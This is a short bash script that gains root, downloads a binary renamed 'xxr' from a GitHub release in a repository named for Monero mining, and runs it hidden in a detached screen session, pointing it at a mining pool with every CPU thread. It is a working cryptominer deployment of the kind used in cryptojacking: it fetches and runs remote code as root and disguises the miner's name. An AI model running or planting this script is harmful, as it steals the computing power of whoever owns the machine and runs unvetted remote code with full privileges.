#!/bin/bash
sudo -i <<EOF
apt-get update
apt-get -y install libhwloc15
mkdir xxr
cd ./xxr
wget https://github.com/yuqingkj/mine_xmr/releases/download/6.22.0/xxr
chmod 777 ./xxr
screen -dmS xxr
screen -x -S xxr -p 0 -X stuff "./xxr -o bt.azshop.one:3333 --rig-id az -t $(nproc) \n"
echo ok
EOF
